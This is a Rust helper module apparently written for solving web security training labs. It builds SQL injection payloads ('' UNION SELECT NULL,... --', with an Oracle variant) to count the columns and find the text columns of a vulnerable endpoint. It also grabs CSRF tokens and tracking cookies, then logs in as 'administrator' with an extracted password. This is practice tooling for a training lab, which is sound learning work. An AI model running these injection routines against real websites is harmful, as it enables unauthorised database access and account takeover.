use clap::Parser;
use regex::Regex;
use reqwest::blocking::{Client, ClientBuilder};
use scraper::{Html, Selector};
use std::iter::repeat_n;
use std::sync::LazyLock;
use url::Url;

static TRACKING_ID_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"TrackingId=(.+?);").expect("[-] Failed to generate TRACKING_ID_REGEX")
});

pub static LOGIN_CSRF_TOKEN_SELECTOR: LazyLock<Selector> =
    LazyLock::new(|| Selector::parse("form input[name=csrf]").unwrap());

pub static HTTP_CLIENT: LazyLock<Client> = LazyLock::new(|| {
    ClientBuilder::new()
        .cookie_store(true)
        .build()
        .expect("[-] Failed to generate reqwest blocking client")
});

pub static LAB_IS_SOLVED_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"Congratulations, you solved the lab!")
        .expect("[-] Failed to generate LAB_IS_SOLVED_REGEX")
});

static DEFAULT_EXTRACT_TARGET_STRING_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"Make\sthe\sdatabase\sretrieve\sthe\sstring:\s'(.+?)'")
        .expect("[-] Failed to construct EXTRACT_TARGET_STRING_REGEX")
});

#[derive(Parser, Debug)]
pub struct Args {
    /// Your Lab Instance URL is Required
    #[arg(short, long, value_parser = parse_url)]
    pub lab_url: Url,

    /// Burp Collaborator Domain
    #[arg(short, long)]
    pub collaborator_domain: Option<String>,
}

fn parse_url(s: &str) -> Result<Url, String> {
    Url::parse(s).map_err(|e| logger::error_return(format!("[-] Invalid URL: {}", e).as_ref()))
}

pub fn generate_clap_parser() -> Args {
    Args::parse()
}

pub fn get_csrf_token(body: &str, selector: &Selector) -> String {
    // Parsing the HTML page with Scraper
    let document = Html::parse_document(body);

    // Using CSS Selector to find the element CSRF that contains the CSRF Token and
    // extracting the CSRF token value from the element attributes
    document
        .select(selector)
        .next()
        .and_then(|element_ref| element_ref.attr("value"))
        .map(|v| v.to_string())
        .unwrap_or_else(|| logger::error_return("CSRF Token Not Found"))
}

pub fn fetch_target_string(lab_url: &str, pattern: Option<&LazyLock<Regex>>) -> String {
    let pattern: &Regex = match pattern {
        Some(lock) => lock,
        None => &DEFAULT_EXTRACT_TARGET_STRING_REGEX,
    };

    logger::info("Fetching the string that is to be queried from the database");

    let response = HTTP_CLIENT
        .get(lab_url)
        .send()
        .expect("[-] Failed to fetch the lab page")
        .text()
        .expect("[-] Failed to extract the body");

    let target_string: &str = pattern
        .captures(&response)
        .expect("[-] Failed to find the target string")
        .get(1)
        .expect("[-] Failed to capture the target string")
        .as_str();

    logger::success(format!("String to be queried from database: {}", target_string).as_ref());

    target_string.to_string()
}

pub fn find_no_of_columns(
    lab_url_with_end_point: &str,
    comment: Option<&str>,
    oracle: Option<bool>,
) -> usize {
    let comment = comment.unwrap_or("--");
    let oracle: bool = oracle.unwrap_or(false);

    logger::info("Determining the number of columns using UNION SELECT...");

    let mut columns = 1;

    loop {
        let payload = repeat_n("NULL", columns).collect::<Vec<&str>>().join(", ");
        let query = format!(
            "' UNION SELECT {} {} {}",
            payload,
            if oracle { "FROM dual" } else { "" },
            comment
        );

        logger::info(
            format!(
                "Making query {}: {}{}",
                columns, lab_url_with_end_point, query
            )
            .as_ref(),
        );

        if HTTP_CLIENT
            .get(format!("{}{}", lab_url_with_end_point, query))
            .send()
            .expect("[-] Failed to make a GET request")
            .status()
            == 200
        {
            break;
        } else {
            columns += 1;
        }
    }

    logger::success(
        format!(
            "The number of columns found using UNION SELECT is {}",
            columns
        )
        .as_ref(),
    );

    columns
}

pub fn find_columns_of_type_string(
    lab_url_with_end_point: &str,
    no_of_columns: usize,
    comment: Option<&str>,
    oracle: Option<bool>,
) -> Vec<usize> {
    let comment = comment.unwrap_or("--");
    let oracle: bool = oracle.unwrap_or(false);

    logger::info("Finding columns that contain text...");

    let mut target_columns: Vec<usize> = Vec::new();

    for i in 0..no_of_columns {
        let payload = (0..no_of_columns)
            .map(|column| if column == i { "'string'" } else { "NULL" })
            .collect::<Vec<&str>>()
            .join(", ");

        let query = format!(
            "' UNION SELECT {} {} {}",
            payload,
            if oracle { "FROM dual" } else { "" },
            comment
        );

        logger::info(format!("Making query {}: {}{}", i, lab_url_with_end_point, query).as_ref());

        if HTTP_CLIENT
            .get(format!("{}{}", lab_url_with_end_point, query))
            .send()
            .expect("[-] ")
            .status()
            == 200
        {
            target_columns.push(i);
        } else {
            continue;
        }
    }

    logger::success(
        format!(
            "The columns containing text are: {} (Index starts from 0!)",
            target_columns
                .iter()
                .map(|e| e.to_string())
                .collect::<Vec<String>>()
                .join(", ")
        )
        .as_ref(),
    );

    target_columns
}

pub fn check_is_lab_solved(lab_url: &str) {
    logger::info("Checking whether the lab is solved or not...");

    let response = HTTP_CLIENT
        .get(lab_url)
        .send()
        .expect("[-] Failed to fetch the lab page");

    if LAB_IS_SOLVED_REGEX.is_match(
        response
            .text()
            .expect("[-] Failed to extract response")
            .as_ref(),
    ) {
        logger::success("Lab is solved successfully")
    } else {
        logger::error("Lab is not yet solved")
    }
}

pub fn print_tables(column_names: Vec<&str>, rows: Vec<Vec<String>>) {
    let columns_width = rows
        .iter()
        .flat_map(|row| row.iter().map(|s| s.len()))
        .max()
        .expect("[-] rows must contain at least one cell");

    let divider = format!(
        "|-{}-|",
        column_names
            .iter()
            .map(|_| "-".repeat(columns_width))
            .collect::<Vec<_>>()
            .join("-|-")
    );

    println!("{}", divider);
    println!(
        "| {} |",
        column_names
            .iter()
            .map(|col| format!("{:^width$}", col, width = columns_width))
            .collect::<Vec<_>>()
            .join(" | ")
    );
    println!("{}", divider);

    for row in rows {
        println!(
            "| {} |",
            row.iter()
                .map(|col| format!("{:^width$}", col, width = columns_width))
                .collect::<Vec<_>>()
                .join(" | ")
        );
    }

    println!("{}", divider);
}

pub fn get_tracking_id(lab_url: &str) -> String {
    logger::info("Fetching the Tracking ID");

    let response = HTTP_CLIENT
        .get(lab_url)
        .send()
        .expect("Failed to send a GET request to /");

    let set_cookie = response
        .headers()
        .get("set-cookie")
        .expect("[-] set-cookie not found");

    let tracking_id = TRACKING_ID_REGEX
        .captures(set_cookie.to_str().expect("[-] Failed to convert to &str"))
        .expect("[-] No captures found")
        .get(1)
        .expect("[-] No capture groups found. Unable to get capture group 1")
        .as_str();

    logger::success(format!("Got the Tracking ID: {}", tracking_id).as_ref());

    tracking_id.to_string()
}

pub fn login_as_administrator(lab_url: &str, password: String) {
    logger::info("Now logging in as administrator");
    logger::info("Getting the login page CSRF TOKEN");

    // Making a GET request to the login page
    let response = HTTP_CLIENT
        .get(format!("{lab_url}/login"))
        .send()
        .expect("[-] Failed to fetch the login page");

    let login_page_csrf_token = get_csrf_token(
        response
            .text()
            .expect("[-] Failed to extract login page body")
            .as_str(),
        &LOGIN_CSRF_TOKEN_SELECTOR,
    );

    logger::success(format!("Login Page CSRF Token: {}", login_page_csrf_token).as_ref());
    logger::info("Attempting to login as `administrator`");

    let response = HTTP_CLIENT
        .post(format!("{}/login", lab_url))
        .form(&[
            ("csrf", login_page_csrf_token),
            ("username", "administrator".to_string()),
            ("password", password),
        ])
        .send()
        .expect("[-] Failed to login as administrator");

    if response.status() == 200 {
        if response
            .text()
            .expect("[-] Failed to extract text from response")
            .contains("Your username is: administrator")
        {
            logger::success("Login succesfully as administrator");
        } else {
            panic!(
                "{}",
                logger::error_return(
                    "Failed to login as administrator; Probably password is wrong"
                )
            )
        }
    } else {
        panic!(
            "{}",
            logger::error_return("Failed to login as administrator")
        )
    }
}
